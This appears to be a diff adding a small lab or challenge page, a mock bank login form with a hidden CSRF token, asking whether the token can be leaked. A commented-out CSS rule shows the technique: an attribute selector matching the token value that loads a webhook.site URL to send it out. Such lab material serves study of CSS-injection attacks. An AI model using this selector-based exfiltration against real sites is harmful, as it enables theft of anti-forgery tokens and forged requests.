@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Leak my csrf token</title>
+    <!-- <style>
+        form:has(input[name="csrf-token"][value="abcd-1234"]) {
+            background: url("https://webhook.site/...?tok2");
+        }
+    </style> -->
+</head>
+<body>
+    <h1>Bank hard</h1>
+    <p>CSRF token as the last input, can you still leak it?</p>
+    <form>
+        <input type="text" name="username" />
+        <input type="password" name="password" />
+        <button type="submit">Submit</button>
+        <input type="hidden" name="csrf-token" value="abcd-1234" />
+    </form>
+</body>
+</html>
